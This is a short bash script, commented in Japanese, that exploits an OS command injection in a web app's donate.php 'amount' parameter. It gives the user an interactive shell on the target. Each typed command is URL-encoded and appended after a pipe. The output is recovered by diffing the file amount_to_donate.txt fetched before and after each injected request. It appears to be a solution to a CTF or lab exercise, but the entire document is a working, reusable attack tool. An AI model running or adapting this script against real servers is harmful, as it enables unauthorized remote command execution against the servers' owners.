#!/bin/bash

read -rp 'Host: ' host
read -rp 'Port: ' port

while true; do
  read -rp '$ ' raw_command
  command=$(printf %s "${raw_command}" | jq -sRr @uri)

  # 以前のコマンド出力の一覧を保存
  prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")

  # OSコマンドインジェクションを実行する
  curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"
  
  # 新しいコマンド出力の一覧を保存する
  new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
  
  # 2つのコマンド出力の差分のみを抽出する
  delta=$(diff --new-line-format="%L" \
               --unchanged-line-format="" \
               <(echo "${prev_resp}") <(echo "${new_resp}"))

  # コマンドの実行結果を出力
  echo "${delta}"

done
